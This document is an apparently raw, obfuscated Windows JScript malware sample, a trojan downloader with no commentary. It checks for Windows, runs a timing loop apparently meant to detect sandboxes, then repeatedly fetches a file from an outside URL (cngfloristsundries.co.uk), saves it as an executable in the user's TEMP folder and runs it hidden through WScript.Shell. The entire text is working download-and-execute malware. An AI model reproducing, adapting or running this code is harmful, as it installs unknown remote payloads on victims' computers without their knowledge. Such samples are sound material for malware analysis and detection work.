var c = false;
var hc = "CreateObject";
var k0 = function y() {return WScript[hc]("WScript.Shell");}(), mr = 11;
var nn = "MSXML2.XMLHTTP";
var X = 2123213;
var e = 0;
function i(UX){k0["Run"](UX, e, e);};
function N(){return "" + nn;};
function ZC(i0, vS){e = e * 1; return i0 - vS;};
function W(){return hc;};
/*@cc_on
  @if (@_win32 || @_win64)
    c = true;
  @end
@*/
if (c)
{
var Ks = "";
function b(){return 22;};
var A = 0; var ue = 0;
function dV()
{
var iR = new this["Date"]();
var Ex = iR["getUTCMilliseconds"]();
WScript["Sleep"](b());
var iR = new this["Date"]();
var xN = iR["getUTCMilliseconds"]();
WScript["Sleep"](b());
var iR = new this["Date"]();
var Hr = iR["getUTCMilliseconds"]();
var A = "Y";
A = ZC(xN, Ex);
var ue = "j0";
ue = ZC(Hr, xN);
Ks = "open";
return ZC(A, ue);
}
var Bn = false;
var na = false;
for (var Ry = e; Ry < b() * 1; Ry++){if (dV() != e){
Bn = true; 
ue = "31" + 11 * A + ue; 
na = true; 
break;
}}
function M() {return ((Bn == true) && (Bn == na)) ? 1 : e;};
if (Bn && M() && na){
function j() {return k0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "uYSKpIWSEPs.exe";};
 JT = N();
 if0 = WScript[hc](JT);
 var AC = 1;
 while (AC){
try {
if0[Ks]("GET", "http://cngfloristsundries.co.uk/mo4erp", false);
if0["send"]();
bT = "Sleep";
for (;;){WScript[bT](b() * 11); if (if0["readystate"] >= 2 * 2) break;};
AC = e;
} catch(h){};
}
function k(za) {var f = (1, 2, 3, 4, 5, za); return f;};
LL = WScript[W()]("ADODB.Stream");
JT = LL;
JT[Ks]();
JT["type"] = k(1);
JT["write"](if0["ResponseBody"]);
LL["position"] = k(e);
JT["Save" + "ToFile"](j(), 2);
LL["c"+"lose"]();
V = j();
i(V);
}
}

